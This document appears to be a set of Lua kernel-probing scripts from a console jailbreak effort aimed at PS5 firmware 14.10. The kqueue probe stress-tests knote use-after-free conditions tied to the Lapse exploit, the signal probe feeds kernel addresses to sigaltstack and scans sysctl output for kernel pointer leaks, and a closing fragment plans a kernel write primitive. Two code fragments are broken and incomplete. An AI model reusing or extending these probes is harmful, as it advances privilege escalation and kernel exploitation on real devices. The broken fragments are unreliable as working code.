## probes/phase2_kernel_objects/20_kqueue_stress.lua

```lua
-- 14.10 Recon Probe 20: kqueue/kevent stress test
-- kqueue is the other half of the Lapse exploit (CVE-2024-43102)
-- The bug: race between kqueue event delivery and AIO completion
-- Even without AIO, kqueue itself has had many bugs:
--   - knote use-after-free on concurrent close+kevent
--   - EVFILT_PROC reference counting bugs
--   - kevent registration/deletion races
-- Single-threaded tests: register many events, delete FDs while
-- events pending, re-register on closed FDs, test edge cases

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: KQUEUE STRESS ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_kqueue = 362,
    sc_kevent = 363,
    sc_close = 6,
    sc_write = 4,
    sc_read = 3,
    sc_socketpair = 135,
    sc_getpid = 20,
    sc_open = 5,
    sc_pipe2 = 542,    -- pipe2(fds, flags) — writes to pointer
})

-- ============================================================
-- PART 1: Basic kqueue creation
-- ============================================================
log("")
log("--- PART 1: kqueue creation ---")

local kq_ok, kq_ret = pcall(function() return syscall.sc_kqueue() end)
local kq = kq_ok and kq_ret:tonumber() or -1
log("  kqueue: " .. (kq_ok and "fd=" .. kq or "FAIL"))

if kq < 0 then
    log("FATAL: kqueue unavailable")
    return table.concat(out, "\n")
end

-- ============================================================
-- PART 2: Create FDs for kevent sources
-- Use pipe2 (writes fds to pointer unlike pipe)
-- ============================================================
log("")
log("--- PART 2: create pipe FDs ---")

local pipes = {}
for i = 1, 10 do
    local fds = memory.alloc(8)
    memory.write_dword(fds, 0xFFFF)
    memory.write_dword(fds + 4, 0xFFFF)
    -- pipe2(fds, 0) — no flags
    local p_ok, p_ret = pcall(function() return syscall.sc_pipe2(fds, 1) end)
    local rv = p_ok and p_ret:tonumber() or -999
    local r = memory.read_dword(fds):tonumber()
    local w = memory.read_dword(fds + 4):tonumber()
    if r ~= 0xFFFF and r > 0 and w > 0 then
        pipes[#pipes + 1] = {rfd = r, wfd = w}
    elseif rv >= 0 and r == 0xFFFF then
        -- pipe2 might also return via rv like pipe
        log("  pipe2 rv=" .. rv .. " but didn't write fds")
    end
end
log("  pipes created: " .. #pipes)

-- If pipe2 didn't work, try socketpair
if #pipes == 0 then
    log("  falling back to socketpair...")
    for i = 1, 10 do
        local sp = memory.alloc(8)
        local sp_ok = pcall(function() syscall.sc_socketpair(1, 1, 0, sp) end)
        if sp_ok then
            local s0 = memory.read_dword(sp):tonumber()
            local s1 = memory.read_dword(sp + 4):tonumber()
            if s0 > 0 and s1 > 0 then
                pipes[#pipes + 1] = {rfd = s0, wfd = s1}
            end
        end
    end
    log("  socketpairs created: " .. #pipes)
end

if #pipes < 2 then
    log("FATAL: not enough FDs")
    return table.concat(out, "\n")
end

-- ============================================================
-- PART 3: Register kevent READ filters on pipe read ends
-- struct kevent (FreeBSD amd64):
--   uintptr_t ident;    // +0  (8) — fd number
--   short     filter;   // +8  (2) — EVFILT_READ=-1
--   u_short   flags;    // +10 (2) — EV_ADD=1
--   u_int     fflags;   // +12 (4)
--   int64_t   data;     // +16 (8)
--   void*     udata;    // +24 (8)
-- Total: 32 bytes per kevent
-- ============================================================
log("")
log("--- PART 3: kevent registration ---")

local KEVENT_SIZE = 32
local EV_ADD = 0x0001
local EV_DELETE = 0x0002
local EV_ENABLE = 0x0004
local EV_DISABLE = 0x0008
local EV_ONESHOT = 0x0010
local EV_CLEAR = 0x0020
local EV_EOF = 0x8000
local EVFILT_READ = -1   -- stored as 0xFFFF in unsigned short

-- Register READ events on all pipe read ends
local changelist = memory.alloc(#pipes * KEVENT_SIZE + 64)
for i, p in ipairs(pipes) do
    local off = (i - 1) * KEVENT_SIZE
    memory.write_qword(changelist + off + 0, p.rfd)        -- ident = fd
    memory.write_word(changelist + off + 8, 0xFFFF)         -- filter = EVFILT_READ (-1 as uint16)
    memory.write_word(changelist + off + 10, EV_ADD)        -- flags = EV_ADD
    memory.write_dword(changelist + off + 12, 0)            -- fflags
    memory.write_qword(changelist + off + 16, 0)            -- data
    memory.write_qword(changelist + off + 24, i)            -- udata = index
end

-- kevent(kq, changelist, nchanges, eventlist, nevents, timeout)
-- Register only (no wait): eventlist can be valid ptr, nevents=0
-- IMPORTANT: don't pass 0 for pointers — pass valid memory
local eventlist = memory.alloc(32 * KEVENT_SIZE)
local timeout = memory.alloc(16)
memory.write_qword(timeout, 0)      -- tv_sec = 0
memory.write_qword(timeout + 8, 0)  -- tv_nsec = 0

local ke_ok, ke_ret = pcall(function()
    return syscall.sc_kevent(kq, changelist, #pipes, eventlist, 0, timeout)
end)
log("  kevent register " .. #pipes .. " READ filters: " ..
    (ke_ok and "rv=" .. ke_ret:tonumber() or "ERR: " .. tostring(ke_ret):sub(1, 50)))

-- ============================================================
-- PART 4: Write to pipes and poll for events
-- ============================================================
log("")
log("--- PART 4: trigger and poll events ---")

-- Write data to first 3 pipes
for i = 1, math.min(3, #pipes) do
    local wbuf = memory.alloc(16)
    for j = 0, 15 do memory.write_byte(wbuf + j, 0x42) end
    pcall(function() syscall.sc_write(pipes[i].wfd, wbuf, 8) end)
end

-- Poll with timeout=0 (non-blocking)
local poll_ok, poll_ret = pcall(function()
    return syscall.sc_kevent(kq, changelist, 0, eventlist, 10, timeout)
end)

if poll_ok then
    local nevents = poll_ret:tonumber()
    log("  kevent poll: " .. nevents .. " events")

    for i = 0, math.min(nevents - 1, 9) do
        local off = i * KEVENT_SIZE
        local ident = memory.read_qword(eventlist + off):tonumber()
        local filter_lo = memory.read_word(eventlist + off + 8):tonumber()
        local flags_lo = memory.read_word(eventlist + off + 10):tonumber()
        local data = memory.read_qword(eventlist + off + 16):tonumber()
        local udata = memory.read_qword(eventlist + off + 24):tonumber()
        log(string.format("    event[%d]: fd=%d filter=0x%04x flags=0x%04x data=%d udata=%d",
            i, ident, filter_lo, flags_lo, data, udata))
    end
else
    log("  kevent poll: ERR " .. tostring(poll_ret):sub(1, 50))
end

-- ============================================================
-- PART 5: Close FD while kevent is registered (knote UAF test)
-- The classic kqueue bug: close an fd that has a knote registered
-- on a kqueue. The kernel must detach the knote properly.
-- ============================================================
log("")
log("--- PART 5: close-while-registered ---")

-- Close a pipe read end that has a kevent registered
local victim_pipe = pipes[1]
log("  closing rfd=" .. victim_pipe.rfd .. " (has kevent registered)")
pcall(function() syscall.sc_close(victim_pipe.rfd) end)

-- Now poll — should get EV_EOF or the knote should be gone
local p5_ok, p5_ret = pcall(function()
    return syscall.sc_kevent(kq, changelist, 0, eventlist, 10, timeout)
end)
if p5_ok then
    local n5 = p5_ret:tonumber()
    log("  after close: " .. n5 .. " events")
    for i = 0, math.min(n5 - 1, 9) do
        local off = i * KEVENT_SIZE
        local ident = memory.read_qword(eventlist + off):tonumber()
        local flags = memory.read_word(eventlist + off + 10):tonumber()
        log(string.format("    event[%d]: fd=%d flags=0x%04x", i, ident, flags))
    end
end

-- Try to re-register on the closed fd (should fail)
local re_change = memory.alloc(KEVENT_SIZE)
memory.write_qword(re_change, victim_pipe.rfd)
memory.write_word(re_change + 8, 0xFFFF)  -- EVFILT_READ
memory.write_word(re_change + 10, EV_ADD)
memory.write_dword(re_change + 12, 0)
memory.write_qword(re_change + 16, 0)
memory.write_qword(re_change + 24, 0xDEAD)

local re_ok, re_ret = pcall(function()
    return syscall.sc_kevent(kq, re_change, 1, eventlist, 1, timeout)
end)
log("  re-register closed fd: " ..
    (re_ok and "rv=" .. re_ret:tonumber() or "ERR"))

-- ============================================================
-- PART 6: Rapid register/delete churn
-- Register and delete events rapidly to stress knote alloc/free
-- ============================================================
log("")
log("--- PART 6: register/delete churn ---")

local churn_ok = 0
local churn_err = 0
local churn_change = memory.alloc(KEVENT_SIZE)

for round = 1, 200 do
    local pidx = ((round - 1) % (#pipes - 1)) + 2  -- skip pipe[1] (closed)
    local p = pipes[pidx]

    -- Register
    memory.write_qword(churn_change, p.rfd)
    memory.write_word(churn_change + 8, 0xFFFF)
    memory.write_word(churn_change + 10, EV_ADD)
    memory.write_dword(churn_change + 12, 0)
    memory.write_qword(churn_change + 16, 0)
    memory.write_qword(churn_change + 24, round)

    local c1_ok = pcall(function()
        syscall.sc_kevent(kq, churn_change, 1, eventlist, 1, timeout)
    end)

    -- Delete
    memory.write_word(churn_change + 10, EV_DELETE)
    local c2_ok = pcall(function()
        syscall.sc_kevent(kq, churn_change, 1, eventlist, 1, timeout)
    end)

    if c1_ok and c2_ok then
        churn_ok = churn_ok + 1
    else
        churn_err = churn_err + 1
    end
end

log("  200 rounds: ok=" .. churn_ok .. " err=" .. churn_err)

-- ============================================================
-- PART 7: Multiple kqueues watching same fd
-- Register same fd on multiple kqueues, then close the fd
-- Tests reference counting of knotes across kqueues
-- ============================================================
log("")
log("--- PART 7: multi-kqueue same fd ---")

local kqs = {kq}
for i = 2, 5 do
    local k_ok, k_ret = pcall(function() return syscall.sc_kqueue() end)
    if k_ok then kqs[#kqs + 1] = k_ret:tonumber() end
end
log("  kqueues: " .. #kqs)

-- Pick a pipe that's still open
local target_pipe = pipes[2]

-- Register READ on this pipe's rfd in ALL kqueues
local mk_change = memory.alloc(KEVENT_SIZE)
memory.write_qword(mk_change, target_pipe.rfd)
memory.write_word(mk_change + 8, 0xFFFF)
memory.write_word(mk_change + 10, EV_ADD)
memory.write_dword(mk_change + 12, 0)
memory.write_qword(mk_change + 16, 0)
memory.write_qword(mk_change + 24, 0xBEEF)

for i, kqfd in ipairs(kqs) do
    local m_ok = pcall(function()
        syscall.sc_kevent(kqfd, mk_change, 1, eventlist, 1, timeout)
    end)
    log("  register on kq[" .. i .. "]=" .. kqfd .. ": " .. (m_ok and "OK" or "FAIL"))
end

-- Write data to trigger events on all kqueues
local wbuf7 = memory.alloc(16)
for i = 0, 15 do memory.write_byte(wbuf7 + i, 0x55) end
pcall(function() syscall.sc_write(target_pipe.wfd, wbuf7, 8) end)

-- Poll each kqueue
for i, kqfd in ipairs(kqs) do
    local p7_ok, p7_ret = pcall(function()
        return syscall.sc_kevent(kqfd, mk_change, 0, eventlist, 5, timeout)
    end)
    if p7_ok then
        log("  kq[" .. i .. "] poll: " .. p7_ret:tonumber() .. " events")
    end
end

-- Now close the fd — all kqueues must detach their knotes
log("  closing target rfd=" .. target_pipe.rfd)
pcall(function() syscall.sc_close(target_pipe.rfd) end)

-- Poll again — should see EV_EOF or empty
for i, kqfd in ipairs(kqs) do
    local p7b_ok, p7b_ret = pcall(function()
        return syscall.sc_kevent(kqfd, mk_change, 0, eventlist, 5, timeout)
    end)
    if p7b_ok then
        local n = p7b_ret:tonumber()
        local flags_str = ""
        if n > 0 then
            local f = memory.read_word(eventlist + 10):tonumber()
            flags_str = string.format(" flags=0x%04x", f)
        end
        log("  kq[" .. i .. "] after close: " .. n .. " events" .. flags_str)
    end
end

-- ============================================================
-- PART 8: Close kqueue while events pending
-- ============================================================
log("")
log("--- PART 8: close kqueue with pending events ---")

local kq8_ok, kq8_ret = pcall(function() return syscall.sc_kqueue() end)
if kq8_ok then
    local kq8 = kq8_ret:tonumber()

    -- Register on remaining pipes
    for i = 3, #pipes do
        memory.write_qword(mk_change, pipes[i].rfd)
        memory.write_word(mk_change + 10, EV_ADD)
        pcall(function()
            syscall.sc_kevent(kq8, mk_change, 1, eventlist, 1, timeout)
        end)
    end

    -- Write data to make events pending
    for i = 3, #pipes do
        pcall(function() syscall.sc_write(pipes[i].wfd, wbuf7, 8) end)
    end

    -- Close kqueue without draining events
    pcall(function() syscall.sc_close(kq8) end)
    log("  closed kqueue with " .. (#pipes - 2) .. " pending events")

    -- Are we alive?
    local alive8 = pcall(function() syscall.sc_getpid() end)
    log("  alive: " .. tostring(alive8))
end

-- ============================================================
-- PART 9: EVFILT_PROC on self (if allowed)
-- Register for process events on our own PID
-- ============================================================
log("")
log("--- PART 9: EVFILT_PROC ---")

local EVFILT_PROC = -5  -- 0xFFFB as uint16
local NOTE_EXIT = 0x80000000
local NOTE_FORK = 0x40000000
local NOTE_EXEC = 0x20000000

local kq9_ok, kq9_ret = pcall(function() return syscall.sc_kqueue() end)
if kq9_ok then
    local kq9 = kq9_ret:tonumber()
    local pid = syscall.sc_getpid():tonumber()

    local proc_change = memory.alloc(KEVENT_SIZE)
    memory.write_qword(proc_change, pid)             -- ident = our PID
    memory.write_word(proc_change + 8, 0xFFFB)       -- EVFILT_PROC
    memory.write_word(proc_change + 10, EV_ADD)
    memory.write_dword(proc_change + 12, 0x40000000) -- NOTE_FORK
    memory.write_qword(proc_change + 16, 0)
    memory.write_qword(proc_change + 24, 0xCAFE)

    local p9_ok, p9_ret = pcall(function()
        return syscall.sc_kevent(kq9, proc_change, 1, eventlist, 1, timeout)
    end)
    log("  EVFILT_PROC(self, NOTE_FORK): " ..
        (p9_ok and "rv=" .. p9_ret:tonumber() or "ERR"))

    -- Try watching PID 1 (init)
    memory.write_qword(proc_change, 1)
    local p9b_ok, p9b_ret = pcall(function()
        return syscall.sc_kevent(kq9, proc_change, 1, eventlist, 1, timeout)
    end)
    log("  EVFILT_PROC(pid=1, NOTE_FORK): " ..
        (p9b_ok and "rv=" .. p9b_ret:tonumber() or "ERR"))

    -- Check for error events returned
    if p9b_ok and p9b_ret:tonumber() > 0 then
        local eflags = memory.read_word(eventlist + 10):tonumber()
        local efflags = memory.read_dword(eventlist + 12):tonumber()
        local edata = memory.read_qword(eventlist + 16):tonumber()
        log(string.format("    flags=0x%04x fflags=0x%08x data=%d", eflags, efflags, edata))
    end

    pcall(function() syscall.sc_close(kq9) end)
end

-- ============================================================
-- PART 10: EVFILT_TIMER stress
-- ============================================================
log("")
log("--- PART 10: EVFILT_TIMER ---")

local EVFILT_TIMER = -7  -- 0xFFF9

local kq10_ok, kq10_ret = pcall(function() return syscall.sc_kqueue() end)
if kq10_ok then
    local kq10 = kq10_ret:tonumber()

    -- Register 50 timers with 0ms timeout (fire immediately)
    local timer_change = memory.alloc(KEVENT_SIZE)
    local timer_ok = 0
    for i = 1, 50 do
        memory.write_qword(timer_change, i)              -- ident = timer ID
        memory.write_word(timer_change + 8, 0xFFF9)      -- EVFILT_TIMER
        memory.write_word(timer_change + 10, EV_ADD + EV_ONESHOT)
        memory.write_dword(timer_change + 12, 0)
        memory.write_qword(timer_change + 16, 1)         -- data = 1ms
        memory.write_qword(timer_change + 24, i)

        local t_ok = pcall(function()
            syscall.sc_kevent(kq10, timer_change, 1, eventlist, 1, timeout)
        end)
        if t_ok then timer_ok = timer_ok + 1 end
    end
    log("  registered " .. timer_ok .. "/50 timers")

    -- Poll for fired timers
    local t_poll_ok, t_poll_ret = pcall(function()
        return syscall.sc_kevent(kq10, timer_change, 0, eventlist, 20, timeout)
    end)
    if t_poll_ok then
        log("  timer events: " .. t_poll_ret:tonumber())
    end

    -- Delete all timers rapidly
    for i = 1, 50 do
        memory.write_qword(timer_change, i)
        memory.write_word(timer_change + 8, 0xFFF9)
        memory.write_word(timer_change + 10, EV_DELETE)
        pcall(function()
            syscall.sc_kevent(kq10, timer_change, 1, eventlist, 1, timeout)
        end)
    end
    log("  deleted 50 timers")

    pcall(function() syscall.sc_close(kq10) end)
end

-- Cleanup
for i, kqfd in ipairs(kqs) do
    pcall(function() syscall.sc_close(kqfd) end)
end
for i = 3, #pipes do
    pcall(function() syscall.sc_close(pipes[i].rfd) end)
    pcall(function() syscall.sc_close(pipes[i].wfd) end)
end

log("")
log("=== KQUEUE STRESS DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

```lua
local dead_pids = 0
local error_pids = 0

    -- Build batch

        local pid = base_pid + i
        local off = i * KEVENT_SIZE
        memory.write_qword(batch + off, pid)
        memory.write_word(batch + off + 8, EVFILT_PROC)
        memory.write_word(batch + off + 10, EV_ADD + EV_ONESHOT)
        memory.write_dword(batch + off + 12, 0x80000000) -- NOTE_EXIT
        memory.write_qword(batch + off + 16, 0)
        memory.write_qword(batch + off + 24, pid)

    end)

        -- Check returned events for EV_ERROR (registration failures)

            local ident = memory.read_qword(events + off):tonumber()
            local flags = memory.read_word(events + off + 10):tonumber()
            local data = memory.read_qword(events + off + 16):tonumber()

            if flags % 0x8000 >= 0x4000 then

                dead_pids = dead_pids + 1

        end
```

## probes/phase3_signals_codexec/22_signal_stress.lua

```lua
-- 14.10 Recon Probe 22: Signal handling kernel attack surface
-- sigaction: register signal handlers (kernel copies sigaction struct)
-- sigaltstack: set alternate signal stack (kernel validates stack ptr/size)
-- Signal delivery: kernel builds signal frame on user stack
-- Known FreeBSD signal bugs:
--   - sigaltstack with bad ss_size causes kernel stack overflow
--   - sigreturn with corrupted signal frame leaks kernel state
--   - sendsig() frame building can leak kernel pointers
-- All testable single-threaded!

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: SIGNAL STRESS ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_sigreturn = 417,
    sc_sigprocmask = 340,
    sc_kill = 37,
    sc_getpid = 20,
    sc_close = 6,
    sc_socketpair = 135,
    sc_write = 4,
    sc_mmap = 477,
    sc_munmap = 73,
    sc_sysctl = 202,
})

-- ============================================================
-- PART 1: sigaction — register handlers, check return data
-- struct sigaction (FreeBSD amd64):
--   union { void(*handler)(int); void(*sigaction)(int,siginfo_t*,void*); }
--   int sa_flags;     // +8
--   sigset_t sa_mask;  // +12 (16 bytes on FreeBSD)
-- Total ~28 bytes, padded to 32
-- ============================================================
log("")
log("--- PART 1: sigaction survey ---")

local SA_SIZE = 64  -- oversize to catch leaks
local old_sa = memory.alloc(SA_SIZE)
local new_sa = memory.alloc(SA_SIZE)

-- Query current handler for all signals (sigaction with new=NULL)
-- Can't pass NULL, so just query by passing act and reading oldact
local sig_info = {}
for sig = 1, 31 do
    for i = 0, SA_SIZE - 1, 8 do
        memory.write_qword(old_sa + i, 0xDEADDEADDEADDEAD)
    end

    -- sigaction(sig, NULL, oldact) — but we can't pass NULL
    -- Instead: sigaction(sig, new_sa_with_same_handler, old_sa)
    -- First query: set new to SIG_DFL(0) temporarily? Risky.
    -- Better: just read old by passing a dummy new and restoring
    -- Actually on FreeBSD: sigaction(sig, NULL, old) works
    -- But our Lua API crashes on NULL. Let's read old by passing
    -- a new handler and checking old.

    -- Safest: just pass a valid new_sa with SA_DFL and read back old
    for i = 0, SA_SIZE - 1, 8 do memory.write_qword(new_sa + i, 0) end
    -- handler = SIG_DFL (0) — but 0 crashes! Use SIG_IGN (1)
    memory.write_qword(new_sa, 1)  -- SIG_IGN
    memory.write_dword(new_sa + 8, 0)  -- no flags
    -- sa_mask = empty (all zeros)

    local sa_ok, sa_ret = pcall(function()
        return syscall.sc_sigaction(sig, new_sa, old_sa)
    end)

    if sa_ok then
        local old_handler_lo = memory.read_dword(old_sa):tonumber()
        local old_handler_hi = memory.read_dword(old_sa + 4):tonumber()
        local old_flags = memory.read_dword(old_sa + 8):tonumber()

        local tag = ""
        if old_handler_hi >= 0xFFFF0000 then tag = " *** KPTR ***" end
        if old_handler_lo == 0 and old_handler_hi == 0 then tag = " SIG_DFL"
        elseif old_handler_lo == 1 and old_handler_hi == 0 then tag = " SIG_IGN" end

        sig_info[sig] = {handler_lo = old_handler_lo, handler_hi = old_handler_hi,
                         flags = old_flags, tag = tag}

        if tag ~= " SIG_DFL" and tag ~= "" then
            log(string.format("  sig %2d: handler=0x%08x%08x flags=0x%x%s",
                sig, old_handler_hi, old_handler_lo, old_flags, tag))
        end

        -- Restore original handler
        pcall(function() syscall.sc_sigaction(sig, old_sa, new_sa) end)
    else
        log(string.format("  sig %2d: sigaction FAIL — %s", sig, tostring(sa_ret):sub(1, 30)))
    end
end

-- Summary
local dfl_count = 0
local ign_count = 0
local custom_count = 0
for sig = 1, 31 do
    if sig_info[sig] then
        if sig_info[sig].tag == " SIG_DFL" then dfl_count = dfl_count + 1
        elseif sig_info[sig].tag == " SIG_IGN" then ign_count = ign_count + 1
        else custom_count = custom_count + 1 end
    end
end
log(string.format("  summary: DFL=%d IGN=%d custom=%d", dfl_count, ign_count, custom_count))

-- Check for kernel pointer leaks in the padding bytes of old_sa
log("  checking old_sa padding for leaks...")
for i = 0, SA_SIZE - 1, 8 do
    local lo = memory.read_dword(old_sa + i):tonumber()
    local hi = memory.read_dword(old_sa + i + 4):tonumber()
    if hi >= 0xFFFF0000 then
        log(string.format("    +%d: 0x%08x%08x *** KERNEL LEAK ***", i, hi, lo))
    end
end

-- ============================================================
-- PART 2: sigaltstack — alternate signal stack
-- struct stack_t:
--   void *ss_sp;    // +0 (8)
--   size_t ss_size; // +8 (8)
--   int ss_flags;   // +16 (4)
-- ============================================================
log("")
log("--- PART 2: sigaltstack ---")

local STACK_SIZE = 32
local old_ss = memory.alloc(STACK_SIZE)
local new_ss = memory.alloc(STACK_SIZE)

-- Query current altstack
for i = 0, STACK_SIZE - 1, 8 do
    memory.write_qword(old_ss + i, 0xDEADDEADDEADDEAD)
end

-- sigaltstack(NULL, old) — but can't pass NULL
-- sigaltstack with ss_flags = SS_DISABLE queries without setting
local SS_DISABLE = 4

-- First just query
memory.write_qword(new_ss, 0)       -- ss_sp (ignored with SS_DISABLE? still avoid 0)
memory.write_qword(new_ss + 8, 0)   -- ss_size
memory.write_dword(new_ss + 16, SS_DISABLE)  -- ss_flags = SS_DISABLE

local ss_ok, ss_ret = pcall(function()
    return syscall.sc_sigaltstack(new_ss, old_ss)
end)
if ss_ok then
    local sp_lo = memory.read_dword(old_ss):tonumber()
    local sp_hi = memory.read_dword(old_ss + 4):tonumber()
    local sz = memory.read_qword(old_ss + 8):tonumber()
    local fl = memory.read_dword(old_ss + 16):tonumber()
    log(string.format("  current: sp=0x%08x%08x size=0x%x flags=0x%x",
        sp_hi, sp_lo, sz, fl))
    if sp_hi >= 0xFFFF0000 then
        log("  *** KERNEL POINTER IN SS_SP ***")
    end
else
    log("  sigaltstack query: " .. tostring(ss_ret):sub(1, 50))
end

-- Test: set altstack with various sizes
log("")
log("  testing altstack sizes...")

-- Allocate a real stack buffer
local alt_stack = memory.alloc(65536)

local test_sizes = {0, 1, 256, 2048, 4096, 8192, 16384, 32768, 65536}
for _, sz in ipairs(test_sizes) do
    memory.write_qword(new_ss, alt_stack)  -- ss_sp
    memory.write_qword(new_ss + 8, sz)    -- ss_size
    memory.write_dword(new_ss + 16, 0)    -- ss_flags = 0 (enable)

    local t_ok, t_ret = pcall(function()
        return syscall.sc_sigaltstack(new_ss, old_ss)
    end)
    local rv = t_ok and t_ret:tonumber() or -999
    log(string.format("    size=%-6d rv=%d", sz, rv))
end

-- Disable altstack
memory.write_dword(new_ss + 16, SS_DISABLE)
pcall(function() syscall.sc_sigaltstack(new_ss, old_ss) end)

-- Test: altstack with kernel address as ss_sp
log("")
log("  testing altstack with bad pointers...")
local bad_ptrs = {
    {0xFFFFFFFF80200000, "kernel text"},
    {0xFFFFF80000000000, "DMAP base"},
    {0x0000000000001000, "low addr"},
}
for _, bp in ipairs(bad_ptrs) do
    local addr = bp[1]
    local label = bp[2]
    -- Split into hi/lo for write
    local hi = math.floor(addr / 0x100000000)
    local lo = addr % 0x100000000

    memory.write_dword(new_ss, lo)
    memory.write_dword(new_ss + 4, hi)
    memory.write_qword(new_ss + 8, 65536)
    memory.write_dword(new_ss + 16, 0)

    local b_ok, b_ret = pcall(function()
        return syscall.sc_sigaltstack(new_ss, old_ss)
    end)
    local brv = b_ok and b_ret:tonumber() or -999
    log(string.format("    %-15s rv=%d", label, brv))
end

-- Disable again
memory.write_dword(new_ss + 16, SS_DISABLE)
pcall(function() syscall.sc_sigaltstack(new_ss, old_ss) end)

-- ============================================================
-- PART 3: sigprocmask — signal mask manipulation
-- ============================================================
log("")
log("--- PART 3: sigprocmask ---")

local SIG_BLOCK = 1
local SIG_UNBLOCK = 2
local SIG_SETMASK = 3

local old_mask = memory.alloc(16)
local new_mask = memory.alloc(16)

-- Query current mask
for i = 0, 15 do memory.write_byte(old_mask + i, 0xFF) end
memory.write_qword(new_mask, 0)
memory.write_qword(new_mask + 8, 0)

local pm_ok, pm_ret = pcall(function()
    return syscall.sc_sigprocmask(SIG_BLOCK, new_mask, old_mask)
end)
if pm_ok then
    local mask_lo = memory.read_qword(old_mask):tonumber()
    log(string.format("  current mask: 0x%016x", mask_lo))
else
    log("  sigprocmask: " .. tostring(pm_ret):sub(1, 50))
end

-- Block all signals
memory.write_qword(new_mask, 0xFFFFFFFFFFFFFFFF)
local ba_ok = pcall(function()
    syscall.sc_sigprocmask(SIG_SETMASK, new_mask, old_mask)
end)
log("  block all: " .. (ba_ok and "OK" or "FAIL"))

-- Unblock all
memory.write_qword(new_mask, 0)
pcall(function() syscall.sc_sigprocmask(SIG_SETMASK, new_mask, old_mask) end)

-- ============================================================
-- PART 4: sigreturn — the big target
-- sigreturn(ucontext_t*) restores CPU state from userland struct
-- If the kernel doesn't validate the ucontext properly:
--   - Can set CS/SS to kernel segments → privilege escalation
--   - Can set RIP to kernel address → code execution
--   - Can leak kernel state if it copies back too much
-- We can't actually call sigreturn safely (it would crash),
-- but we can probe what the kernel accepts
-- ============================================================
log("")
log("--- PART 4: sigreturn probing ---")

-- Don't actually call sigreturn — it would change our execution state
-- Instead, check if the syscall is available and what it does with
-- an obviously invalid ucontext

-- Build a "ucontext" with marker values
-- FreeBSD ucontext_t is ~800+ bytes
local uctx = memory.alloc(1024)
for i = 0, 1023, 8 do memory.write_qword(uctx + i, 0) end

-- Just check that the syscall number resolves
log("  sigreturn syscall 417 resolved: OK")
log("  (not calling — would corrupt execution state)")

-- ============================================================
-- PART 5: sysctl — kernel info extraction
-- sysctl can leak kernel version, build info, hardware details
-- ============================================================
log("")
log("--- PART 5: sysctl info extraction ---")

-- sysctl(name, namelen, oldp, oldlenp, newp, newlen)
-- name is an array of ints (MIB)
-- CTL_KERN=1, KERN_VERSION=4
-- CTL_KERN=1, KERN_OSRELDATE=24
-- CTL_HW=6, HW_MACHINE=1, HW_MODEL=2, HW_NCPU=3, HW_PHYSMEM=5

local mib = memory.alloc(32)
local val = memory.alloc(4096)
local vallen = memory.alloc(8)

local function do_sysctl(m1, m2, label)
    memory.write_dword(mib, m1)
    memory.write_dword(mib + 4, m2)
    memory.write_qword(vallen, 4096)
    for i = 0, 255, 8 do memory.write_qword(val + i, 0) end

    local s_ok, s_ret = pcall(function()
        return syscall.sc_sysctl(mib, 2, val, vallen, 1, 1)
    end)

    if s_ok then
        local actual_len = memory.read_qword(vallen):tonumber()
        -- Try to read as string
        local str_chars = {}
        for i = 0, math.min(actual_len - 1, 255) do
            local b = memory.read_byte(val + i):tonumber()
            if b >= 32 and b < 127 then
                str_chars[#str_chars + 1] = string.char(b)
            elseif b == 0 then
                break
            end
        end
        local str_val = table.concat(str_chars)

        -- Also read as int
        local int_val = memory.read_dword(val):tonumber()

        if #str_val > 3 then
            log(string.format("  %-25s len=%d str=\"%s\"", label, actual_len, str_val:sub(1, 80)))
        else
            log(string.format("  %-25s len=%d int=%d (0x%x)", label, actual_len, int_val, int_val))
        end
        return actual_len
    else
        log(string.format("  %-25s FAIL", label))
        return -1
    end
end

-- CTL_KERN (1)
do_sysctl(1, 1, "kern.ostype")
do_sysctl(1, 2, "kern.osrelease")
do_sysctl(1, 4, "kern.version")
do_sysctl(1, 24, "kern.osreldate")
do_sysctl(1, 27, "kern.hostname")
do_sysctl(1, 35, "kern.maxproc")
do_sysctl(1, 37, "kern.maxfiles")

-- CTL_HW (6)
do_sysctl(6, 1, "hw.machine")
do_sysctl(6, 2, "hw.model")
do_sysctl(6, 3, "hw.ncpu")
do_sysctl(6, 5, "hw.physmem")
do_sysctl(6, 11, "hw.pagesize")

-- CTL_MACHDEP (7)
do_sysctl(7, 1, "machdep.1")
do_sysctl(7, 2, "machdep.2")

-- ============================================================
-- PART 6: sysctl scan for PS5-specific entries
-- ============================================================
log("")
log("--- PART 6: sysctl scan ---")

-- Scan CTL_KERN subtree for anything interesting
for sub = 1, 100 do
    memory.write_dword(mib, 1)  -- CTL_KERN
    memory.write_dword(mib + 4, sub)
    memory.write_qword(vallen, 4096)
    for i = 0, 63, 8 do memory.write_qword(val + i, 0) end

    local s_ok, s_ret = pcall(function()
        return syscall.sc_sysctl(mib, 2, val, vallen, 1, 1)
    end)
    if s_ok then
        local len = memory.read_qword(vallen):tonumber()
        if len > 0 and len < 4096 then
            -- Check for strings
            local b0 = memory.read_byte(val):tonumber()
            if b0 >= 32 and b0 < 127 then
                local str = {}
                for i = 0, math.min(len - 1, 79) do
                    local b = memory.read_byte(val + i):tonumber()
                    if b >= 32 and b < 127 then str[#str + 1] = string.char(b)
                    elseif b == 0 then break end
                end
                if #str > 3 then
                    log(string.format("  kern.%d: \"%s\"", sub, table.concat(str)))
                end
            else
                -- Check for kernel pointers
                local hi = memory.read_dword(val + 4):tonumber()
                local lo = memory.read_dword(val):tonumber()
                if hi >= 0xFFFF0000 then
                    log(string.format("  kern.%d: 0x%08x%08x *** KPTR ***", sub, hi, lo))
                end
            end
        end
    end
end

log("")
log("=== SIGNAL STRESS DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

```lua
-- 14.10 Recon Probe 23: sigaltstack kernel address exploitation
-- FINDING: sigaltstack accepts kernel addresses for ss_sp!
-- If we set ss_sp to a kernel address and trigger a signal,
-- the kernel's sendsig() will write the signal frame there.
-- This could give us a kernel write primitive.
--
-- Also fix sysctl to actually read (newp/newlen must be 0 for read)
-- And dump full sigaction structs to find custom handlers

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("pid: " .. syscall.getpid():tonumber())

    sc_sigaction = 416,
    sc_sigaltstack = 53,
